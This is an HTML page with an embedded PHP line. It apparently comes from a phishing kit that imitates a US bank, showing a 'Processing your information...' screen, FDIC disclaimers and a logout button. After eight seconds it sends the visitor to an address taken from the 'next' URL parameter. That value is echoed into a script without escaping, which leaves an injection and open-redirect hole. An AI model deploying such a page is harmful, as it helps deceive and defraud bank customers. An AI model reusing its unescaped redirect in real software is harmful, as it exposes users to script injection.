<!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="res/helper.css">
</head>
<body>
<div class="container-fluid">
<div class="row d-flex align-items-center">
<div class="col text-left p-3">
<img src="res/logo.svg" style="width:170px;">
</div>
<div class="col text-right p-3">
 <button class="btn bg-white" style="font-size:0.8em;"> Log out
</button>
</div>
</div>
</div>

<div class="container-fluid text-center py-5" style="background:url('res/back.svg') var(--green); background-size:cover;">

<div class="row bg-white rounded d-inline-block p-2" style="width:400px;">
<div class="col pt-5" style="color:green;">
<h4>Processing your information...</h4>
<p class="text-dark" style="font-size:0.7em;">
Please do not leave this page.<br>You will be automatically redirected.
</p>
</div>
<div class="form px-5">
<div class="form-group">
<img src="res/loading.gif" style="width:70px;">
</div>
 
 
</div>
</div>

</div>


<footer class="text-left p-2 mt-5" style="font-size:0.8em;">
<div class="col py-1">
<img src="res/social.png" class="mw-100" style="width:160px;">
</div>
<div class="col py-1">
Lending products are subject to credit application and approval.
</div>
<div class="col py-1  font-weight-bold">
Investment, Insurance and Non-deposit Trust products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT GUARANTEED BY THE BANK • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • MAY LOSE VALUE
</div>
</footer>


<script>
var next = "<?php echo @$_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>
